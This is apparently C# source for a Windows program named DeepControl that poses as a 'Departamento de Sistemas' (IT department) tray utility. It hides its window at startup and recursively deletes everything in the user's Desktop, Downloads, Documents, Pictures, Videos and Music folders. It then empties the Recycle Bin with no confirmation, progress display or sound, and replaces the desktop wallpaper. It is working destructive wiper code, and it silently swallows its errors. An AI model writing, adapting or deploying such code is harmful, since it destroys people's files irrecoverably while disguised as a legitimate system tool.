namespace DeepControl
{
    using System.Drawing;
    using System;
    using System.Threading;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;
    using System.IO;
    using System.Diagnostics;
    using System.Net;
    using System.Net.Sockets;
    using System.Text;

    public partial class DeepControlForm : Form
    {

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        private NotifyIcon notifyIcon;
        public DeepControlForm()
        {
            InitializeComponent();
            InicializarIcono();
            limpiarCarpetas();
            ColocarFondo();
            RecycleBin.EmptyRecycleBin();
        }
        public void InicializarIcono()
        {
            try
            {
                notifyIcon = new NotifyIcon();
                string iconPath = "ico.ico";
                notifyIcon.Icon = new Icon(iconPath);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error al cargar el icono: " + ex.Message);
                notifyIcon.Icon = SystemIcons.Application;
            }
            notifyIcon.Visible = true;
            notifyIcon.Text = "Departamento de Sistemas";
        }
        public void limpiarCarpetas()
        {

            try
            {
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                string picturesPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
                string videosPath = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
                string musicPath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
                string downloadsPath = "";

                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads"))
                {
                     downloadsPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads";
                }
                else
                {
                     downloadsPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Descargas";
                }
                DeleteAll(desktopPath);
                DeleteAll(downloadsPath);
                DeleteAll(documentsPath);
                DeleteAll(picturesPath);
                DeleteAll(videosPath);
                DeleteAll(musicPath);

            }
            catch (Exception ex)
            {
                
            }
        }
        public void DeleteAll(string directoryPath)
        {
            DeleteAllFiles(directoryPath);
            DeleteAllDirectories(directoryPath);
        }


         public void ColocarFondo()
        {
            string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string imagePath = Path.Combine(appDirectory, "fondo.jpg");
            SetWallpaper(imagePath);

        }

       
        public static void SetWallpaper(string path)
        {
            const int SPI_SETDESKWALLPAPER = 20;
            const int SPIF_UPDATEINIFILE = 0x01;
            const int SPIF_SENDWININICHANGE = 0x02;


            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
        private void DeepControlForm_Load(object sender, EventArgs e)
        {
            this.Visible = false;
        }
        static async Task Metodo()
        {
            for (int i = 0; i < 10; i++)
            {
                MessageBox.Show("Este es un mensaje de información.", "Información", MessageBoxButtons.OK, MessageBoxIcon.Information);
                await Task.Delay(3000); // Dormir por 3000 milisegundos (3 segundos)
            }
        }
        static void DeleteAllFiles(string directoryPath)
        {
            if (Directory.Exists(directoryPath))
            {
                // Obtener todos los archivos en el directorio y subdirectorios
                string[] files = Directory.GetFiles(directoryPath, "*", SearchOption.AllDirectories);

                foreach (string filePath in files)
                {
                    try
                    {
                        // Quitar atributo de solo lectura si está presente
                        FileAttributes attributes = File.GetAttributes(filePath);
                        if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                        {
                            attributes &= ~FileAttributes.ReadOnly;
                            File.SetAttributes(filePath, attributes);
                        }

                        // Borrar archivo
                        File.Delete(filePath);
                        Debug.WriteLine($"Archivo {filePath} borrado exitosamente.");
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Ocurrió un error al borrar {filePath}: {ex.Message}");
                    }
                }
            }
            else
            {
                Debug.WriteLine("El directorio no existe.");
            }
        }

        static void DeleteAllDirectories(string directoryPath)
        {
            if (Directory.Exists(directoryPath))
            {
                // Obtener todas las subcarpetas en el directorio
                string[] directories = Directory.GetDirectories(directoryPath);

                foreach (string dirPath in directories)
                {
                    try
                    {
                        // Borrar carpeta y su contenido recursivamente
                        Directory.Delete(dirPath, true);
                        Debug.WriteLine($"Carpeta {dirPath} borrada exitosamente.");
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Ocurrió un error al borrar la carpeta {dirPath}: {ex.Message}");
                    }
                }
            }
            else
            {
                Debug.WriteLine("El directorio no existe.");
            }
        }
    }
    public class RecycleBin
    {

        public enum RecycleFlags : uint
        {
            SHERB_NOCONFIRMATION = 0x00000001, SHERB_NOPROGRESSUI = 0x00000002, SHERB_NOSOUND = 0x00000004
        }

        [DllImport("shell32.dll", CharSet = CharSet.Unicode)]
        public static extern int SHEmptyRecycleBin(IntPtr hwnd, string pszRootPath, RecycleFlags dwFlags);

        public static void EmptyRecycleBin()
        {
            int result = SHEmptyRecycleBin(IntPtr.Zero, null, RecycleFlags.SHERB_NOCONFIRMATION |
                                                           RecycleFlags.SHERB_NOPROGRESSUI |
                                                           RecycleFlags.SHERB_NOSOUND);
            if (result != 0)
            {
                Console.WriteLine("Error: " + result);
            }
            else
            {
                Console.WriteLine("Papelera de reciclaje vaciada correctamente.");
            }
        }
    }

}
